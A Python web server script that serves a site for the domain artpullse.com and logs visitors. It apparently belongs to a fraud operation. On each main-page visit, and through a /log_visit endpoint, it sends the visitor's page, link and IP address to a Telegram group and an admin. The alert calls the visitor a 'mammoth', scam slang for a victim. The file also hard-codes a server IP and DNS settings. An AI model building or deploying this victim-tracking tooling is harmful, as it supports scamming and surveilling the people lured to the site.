#!/usr/bin/env python3
import http.server
import socketserver
import os
import sys
from urllib.parse import urlparse, unquote
import requests
from config import BOT_TOKEN, GROUP_ID, ADMIN_ID

# Настройки сервера для artpullse.com
PORT = 8080  # Используем порт 8080
DIRECTORY = "events-art.com"  # Папка с сайтом
DOMAIN = "artpullse.com"  # Ваш домен

def send_telegram_log(page, link, ip, country=""):
    msg = (
        f"⚠️ Мамонт открыл страницу\n"
        f"📄 Страница: {page}\n"
        f"🔗 Ссылка: {link}\n"
        f"🌍 IP: {ip}\n"
        f"🌏 Страна: {country}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    try:
        requests.post(url, data=data_group, timeout=2)
        requests.post(url, data=data_admin, timeout=2)
    except Exception as e:
        print(f"❌ Не вдалося надіслати лог у Telegram: {e}")

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # Добавляем CORS заголовки для безопасности
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        # Добавляем заголовок для домена
        self.send_header('Server', f'Events Art Server - {DOMAIN}')
        super().end_headers()
    
    def do_GET(self):
        path = unquote(self.path.split('?', 1)[0])
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # Якщо це ресурс — не логувати
        if any(ext in path for ext in skip_ext) or any(d in path for d in skip_dirs):
            return super().do_GET()
        # Нормалізуємо шлях для унікальності
        norm_path = path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # Логувати тільки якщо це основна сторінка
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        if should_log:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"📝 Логуємо відкриття сторінки: {norm_path}")
                send_telegram_log(
                    page=norm_path,
                    link=self.path,
                    ip=self.client_address[0]
                )
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")
    
    def log_message(self, format, *args):
        # Кастомне логування
        print(f"📝 {format % args}")

    def do_POST(self):
        path = unquote(self.path.split('?', 1)[0])
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            import json
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = self.client_address[0]
                send_telegram_log(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def main():
    # Проверяем существование папки с сайтом
    if not os.path.exists(DIRECTORY):
        print(f"❌ Ошибка: Папка '{DIRECTORY}' не найдена!")
        print(f"📁 Поточний шлях: {os.getcwd()}")
        print(f"📁 Шукаємо: {os.path.abspath(DIRECTORY)}")
        sys.exit(1)
    
    print(f"✅ Папка '{DIRECTORY}' знайдена")
    print(f"📁 Повний шлях: {os.path.abspath(DIRECTORY)}")
    
    # Перевіряємо чи є index.html
    index_path = os.path.join(DIRECTORY, 'index.html')
    if not os.path.exists(index_path):
        print(f"❌ Помилка: index.html не знайдено в папці '{DIRECTORY}'!")
        sys.exit(1)
    
    print(f"✅ index.html знайдено: {index_path}")
    
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"🚀 Сервер запущен для домена: {DOMAIN}")
            print(f"📁 Корневая папка: {os.path.abspath(DIRECTORY)}")
            print(f"🌐 Локальный доступ: http://localhost:{PORT}")
            print(f"🌍 Внешний доступ: http://{DOMAIN}:{PORT}")
            print(f"🔗 IP сервера: 144.172.112.39")
            print(f"📝 DNS настройки:")
            print(f"   A запись: @ → 144.172.112.39")
            print(f"   CNAME запись: www → {DOMAIN}")
            print("⏹️  Для остановки нажмите Ctrl+C")
            print("-" * 60)
            
            httpd.serve_forever()
            
    except PermissionError:
        print(f"❌ Ошибка: Нет прав для использования порта {PORT}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n⏹️  Сервер остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 